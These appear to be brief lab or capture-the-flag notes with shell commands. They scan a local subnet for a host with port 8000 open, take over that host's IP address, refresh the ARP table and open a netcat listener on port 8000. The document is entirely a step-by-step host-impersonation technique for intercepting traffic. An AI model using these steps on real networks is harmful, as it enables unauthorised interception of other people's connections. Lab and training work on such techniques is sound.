Check for host with port `8000` open using `nmap`
Change IP address to match the host with port `8000` open
Populate ARP table using `nmap -sn 192.168.0.0/24`

```sh
nmap 192.168.0.0/24 -p8000 --open -oG out
ip addr add 192.168.0.78 dev eth0
ip addr del 192.168.0.91 dev eth0
nmap -sn 192.168.0.0/24
nc -lnvp 8000
```
